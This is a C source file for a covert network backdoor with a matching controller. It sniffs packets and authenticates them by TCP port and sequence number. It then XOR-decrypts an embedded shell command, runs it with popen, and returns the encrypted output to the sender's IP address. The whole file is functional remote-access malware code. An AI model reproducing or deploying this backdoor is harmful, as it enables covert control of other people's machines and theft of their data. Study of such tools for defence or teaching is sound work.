#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "constants.h"
#include "crypto.h"
#include "networking.h"
#include "packet_auth.h"
#include "packet_handler.h"

/*
 * Callback function for examining captured packets.
 *
 * Params:
 *       u_char* args: Pointer to user data.
 *
 *       const struct pcap_pkthdr* header: Struct that contains information
 * about the captured packet.
 *
 *       u_char* packet: Pointer to the captured packet in serialized form.
 */
void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
{
    char ip_str_local[INET_ADDRSTRLEN];
    char ip_str_recv[INET_ADDRSTRLEN];

    struct handler_args *pargs = (struct handler_args *)args;
    Mode mode = pargs->mode;
    struct in_addr this_ip = pargs->address;

    char decrypted[MAX_COMMAND_LEN];

    int tcp_sport;
    unsigned int tcp_seqnum;

    char *payload;

    const struct sniff_ip *ip;
    const struct sniff_tcp *tcp;

    int size_ip = 0;
    int size_tcp = 0;
    int size_payload = 0;

    // clear buffers
    memset(decrypted, 0, MAX_COMMAND_LEN);

    // calculate lengths
    ip = (struct sniff_ip *)(packet + SIZE_ETHERNET);
    size_ip = IP_HL(ip) * 4;

    tcp = (struct sniff_tcp *)(packet + SIZE_ETHERNET + size_ip);
    size_tcp = TH_OFF(tcp) * 4;

    tcp_sport = ntohs(tcp->th_sport);
    tcp_seqnum = ntohl(tcp->th_seq);

    // locate the payload of the packet
    payload = (char *)(packet + SIZE_ETHERNET + size_ip + size_tcp);
    size_payload = ntohs(ip->ip_len) - size_ip - size_tcp;

    // authenticate the packet
    if (!is_seq_num_auth(tcp_sport, tcp_seqnum))
    {
        return;
    }

    // grab addresses
    inet_ntop(AF_INET, &this_ip.s_addr, ip_str_local, INET_ADDRSTRLEN);
    inet_ntop(AF_INET, &ip->ip_src.s_addr, ip_str_recv, INET_ADDRSTRLEN);

    // decrypt the payload
    xor_bytes(XOR_KEY, strlen(XOR_KEY), payload, decrypted, size_payload);

    if (mode == BACKDOOR)
    {
        printf("Got an authenticated packet\n Source port: %u\n Seqnum: %u\n", tcp_sport, tcp_seqnum);
        printf("local addresss = %s, received address = %s\n", ip_str_local, ip_str_recv);
        backdoor_mode(decrypted, this_ip, ip->ip_src);
    }
    else if (mode == CONTROLLER)
    {
        controller_mode(decrypted);
    }
    else
    {
        return;
    }

    return;
}

/*
 * The main logic for the backdoor mode.
 *
 * Params:
 *      const char *decrypted: The decrypted payload.
 *      const struct in_addr this_ip: The ip of the machine that is running the backdoor.
 *      const struct in_addr address: The address of the remote controller that send the packet.
 */
void backdoor_mode(const char *decrypted, const struct in_addr this_ip, const struct in_addr address)
{
    FILE *fp;
    char *command;
    char *end_ptr;
    char line_buffer[MAX_LINE_LEN];
    char encrypted[MAX_LINE_LEN];
    int num_read;

    // verify decrypted payload has a command in it
    if (!(command = get_command(decrypted)))
    {
        printf("Could not find command\n");
        return;
    }

    // execute the command
    fp = popen(command, "r");

    memset(line_buffer, 0, MAX_LINE_LEN);
    memset(encrypted, 0, MAX_LINE_LEN);

    while (fgets(line_buffer, MAX_LINE_LEN, fp))
    {
        xor_bytes(XOR_KEY, strlen(XOR_KEY), line_buffer, encrypted, strlen(line_buffer));
        send_message_to_ip(this_ip, address, SERVER_PORT, encrypted, strlen(line_buffer));

        memset(line_buffer, 0, MAX_LINE_LEN);
        memset(encrypted, 0, MAX_LINE_LEN);
    }

    pclose(fp);
}

/*
 * The main logic for the controller mode.
 *
 * Params:
 *      const char *decrypted: The decrypted payload.
 */
void controller_mode(const char *decrypted)
{
    char *command;

    // ignore packet if it contains a command
    if ((command = get_command(decrypted)))
    {
        return;
    }

    // print out the response
    printf("%s", decrypted);
}

/*
 * Extracts the command from the payload. This function will place a null byte at the end of the command.
 *
 * Params:
 *      const char *payload: The decrypted payload to seach for a command.
 *
 * Returns:
 *      A pointer to the start of the null terminated command string if a command is found, otherwise NULL.
 */
char *get_command(const char *payload)
{
    char *command;
    char *end_ptr;

    if (!(command = strstr(payload, COMMAND_START)))
    {
        printf("Could not find command start\n");
        return NULL;
    }
    command = command + strlen(COMMAND_START);
    if (!(end_ptr = strstr(payload, COMMAND_END)))
    {
        return NULL;
    }
    *end_ptr = 0;

    return command;
}
